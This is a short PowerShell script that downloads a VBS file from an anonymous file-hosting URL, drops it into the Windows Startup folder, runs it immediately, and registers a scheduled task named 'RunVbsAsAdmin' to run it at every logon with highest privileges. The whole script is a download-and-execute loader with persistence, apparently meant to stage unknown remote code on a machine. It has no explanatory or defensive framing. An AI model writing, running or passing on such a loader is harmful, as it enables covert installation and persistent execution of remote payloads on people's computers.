# Define URL of the VBS file
$url = "https://files.catbox.moe/eqlsi1.vbs"

# Correct Startup folder path
$startupFolder = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup"
$startupPath = Join-Path $startupFolder "eqlsi1.vbs"

# Create the Startup folder if it doesn't exist
if (-not (Test-Path $startupFolder)) {
    New-Item -ItemType Directory -Path $startupFolder | Out-Null
}

# Download the VBS file to the Startup folder
Invoke-WebRequest -Uri $url -OutFile $startupPath

# Optionally run it immediately
Start-Process -FilePath "wscript.exe" -ArgumentList "`"$startupPath`"" -NoNewWindow

# === Scheduled Task Setup ===

# Set the script path for scheduled task
$scriptPath = $startupPath

# Create the action
$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$scriptPath`""

# Trigger on user logon
$trigger = New-ScheduledTaskTrigger -AtLogOn

# Use current user with highest privileges
$principal = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive -RunLevel Highest

# Task settings
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable

# Register the task
Register-ScheduledTask -TaskName "RunVbsAsAdmin" -Action $action -Trigger $trigger -Principal $principal -Settings $settings
